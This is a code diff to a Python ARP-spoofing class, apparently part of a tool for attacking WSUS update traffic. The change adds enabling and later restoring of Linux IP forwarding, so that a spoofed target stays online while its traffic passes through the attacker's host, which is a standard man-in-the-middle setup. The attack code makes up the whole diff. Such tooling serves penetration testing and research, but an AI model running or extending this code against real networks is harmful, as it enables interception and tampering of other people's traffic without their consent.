@@ -1,5 +1,6 @@
 from ipaddress import ip_address, IPv4Network
 import logging
+from pathlib import Path
 import sys
 import time
 import traceback
@@ -21,6 +22,7 @@ class ArpSpoofer:
         self.targetIp = None
         self.targetMac = None
         self.spoofIp = None
+        self.ip_forwarding = None
 
     def _spoof(self, targetIp, spoofIp):
         """
@@ -85,12 +87,12 @@ class ArpSpoofer:
         """
         net_mask = ni.ifaddresses(self.interface)[ni.AF_INET][0]["netmask"]
         interface_ip = get_if_addr(self.interface)
-        subnet = IPv4Network(interface_ip + "/" + net_mask, False)
+        self.subnet = IPv4Network(interface_ip + "/" + net_mask, False)
 
-        if ip_address(targetIp) not in subnet:
+        if ip_address(targetIp) not in self.subnet:
             self.logger.critical(f"Target IP address {targetIp} is not in the same subnet as the host! Forgot -I? Exiting...")
             sys.exit(1)
-        elif ip_address(spoofIp) not in subnet:
+        elif ip_address(spoofIp) not in self.subnet:
             gateway = self.get_default_gateway_ip(self.interface)
             if not gateway:
                 self.logger.critical(f"WSUS IP address {spoofIp} is not in the same subnet and {self.interface} has no gateway!")
@@ -101,6 +103,21 @@ class ArpSpoofer:
                 return gateway
         else:
             return spoofIp
+
+    def enable_ip_forwarding(self):
+        """Enable IP forwarding if the the spoofed IP address is not in the same subnet as the host."""
+        # Read ip_fowarding setting and enable it if necessary
+        self.ip_forwarding = Path("/proc/sys/net/ipv4/ip_forward").read_text().strip()
+
+        if self.ip_forwarding == "0":
+            self.logger.warning("IP fowarding not enabled, enabling now")
+            Path("/proc/sys/net/ipv4/ip_forward").write_text("1")
+
+    def disable_ip_forwarding(self):
+        """Disable IP forwarding if it was enabled before."""
+        if self.ip_forwarding == "0":
+            self.logger.warning("Restoring: Disabling IP fowarding")
+            Path("/proc/sys/net/ipv4/ip_forward").write_text("0")
 
     def start(self, targetIp, spoofIp):
         """
@@ -113,6 +130,10 @@ class ArpSpoofer:
         self.spoofIp = self.check_spoofIp_subnet(targetIp, spoofIp)
         self.isRunning = True
 
+        # If we arp spoof the router enable IP forwarding, so that the target still has network access.
+        if ip_address(spoofIp) not in self.subnet:
+            self.enable_ip_forwarding()
+
         self.logger.info(f"Starting ARP spoofing for target {self.targetIp} and spoofing IP address {self.spoofIp}")
         t1 = Thread(target=self._spoof, args=(self.targetIp, self.spoofIp))
         t1.start()
@@ -123,5 +144,8 @@ class ArpSpoofer:
             self.logger.info(f"Stopping ARP spoofing for target {self.targetIp}")
             self.isRunning = False
             self._restore(self.targetIp, self.spoofIp)
+
+            # Restore IP forwarding if it was enabled before
+            self.disable_ip_forwarding()
         else:
             self.logger.error("ARP spoofing is not running")
